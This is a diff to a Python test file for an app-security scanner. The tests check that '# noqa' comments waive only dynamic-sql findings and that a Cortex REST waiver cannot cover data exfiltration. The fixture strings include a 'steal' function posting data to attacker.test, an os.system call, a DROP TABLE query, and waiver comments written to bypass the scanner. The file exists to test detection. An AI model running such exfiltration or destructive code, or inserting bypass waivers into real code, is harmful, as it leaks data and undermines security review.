@@ -234,17 +234,51 @@ def test_security_plus_concat_sql_flagged_p4(tmp_path):
     assert any(x["kind"] == "dynamic-sql" for x in check_app_security.scan_paths([p])["findings"])
 
 
-def test_security_cortex_rest_waiver_and_noqa_d4_p3(tmp_path):
-    # D4/P3: the Snowflake Cortex REST requests waiver and # noqa: <kind> comments
-    # suppress findings; a general requests import (no waiver) still flags.
-    p = _write(
-        tmp_path / "waiver.py",
-        "import requests  # snowflake-cortex-rest\n"
-        "import requests  # noqa: egress\n"
-        "def f(c, fqn):\n"
-        "    return c.sql(f'DESC STREAMLIT {fqn}')  # noqa: dynamic-sql\n",
+def test_noqa_only_waives_dynamic_sql(tmp_path):
+    # `# noqa: dynamic-sql` is the ONE sanctioned waiver (server-controlled
+    # metadata commands). It must NOT be generalizable to silence egress /
+    # code-exec / write-sql — those would be self-service security bypasses.
+    ok = _write(
+        tmp_path / "dyn.py",
+        "def f(c, fqn):\n    return c.sql(f'DESC STREAMLIT {fqn}')  # noqa: dynamic-sql\n",
     )
-    assert check_app_security.scan_paths([p])["ok"]
+    assert check_app_security.scan_paths([ok])["ok"]
+    for snippet, kind in (
+        ("import socket  # noqa: egress\n", "egress"),
+        ("import os\nos.system('x')  # noqa: code-exec\n", "code-exec"),
+        ("def f(c):\n    return c.query('DROP TABLE t')  # noqa: write-sql\n", "write-sql"),
+    ):
+        p = _write(tmp_path / f"{kind}.py", snippet)
+        kinds = {x["kind"] for x in check_app_security.scan_paths([p])["findings"]}
+        assert kind in kinds, f"{kind} must NOT be waivable via # noqa"
+
+
+def test_cortex_rest_waiver_is_validated_not_blanket(tmp_path):
+    # A valid Cortex Analyst shape passes; the same waiver abused to exfiltrate
+    # (requests.post to an external URL) is flagged.
+    valid = _write(
+        tmp_path / "cortex_ok.py",
+        "import os\nimport requests  # snowflake-cortex-rest\n"
+        'SNOWFLAKE_HOST = os.environ["SNOWFLAKE_HOST"]\n'
+        'CORTEX_ANALYST_ENDPOINT = "/api/v2/cortex/analyst/message"\n'
+        'CORTEX_ANALYST_URL = f"https://{SNOWFLAKE_HOST}{CORTEX_ANALYST_ENDPOINT}"\n'
+        "def _token():\n"
+        '    with open("/snowflake/session/token") as fh:\n        return fh.read()\n'
+        "def ask(payload):\n"
+        "    return requests.post(CORTEX_ANALYST_URL, json=payload, headers={'Authorization': _token()})\n",
+    )
+    assert check_app_security.scan_paths([valid])["ok"], check_app_security.scan_paths([valid])[
+        "findings"
+    ]
+    exfil = _write(
+        tmp_path / "cortex_exfil.py",
+        "import requests  # snowflake-cortex-rest\n"
+        "def steal(df):\n    requests.post('https://attacker.test/x', json=df.to_dict())\n",
+    )
+    assert not check_app_security.scan_paths([exfil])["ok"]
+
+
+def test_plain_requests_import_still_flagged(tmp_path):
     bad = _write(tmp_path / "plain.py", "import requests\n")
     assert any(x["kind"] == "egress" for x in check_app_security.scan_paths([bad])["findings"])
 
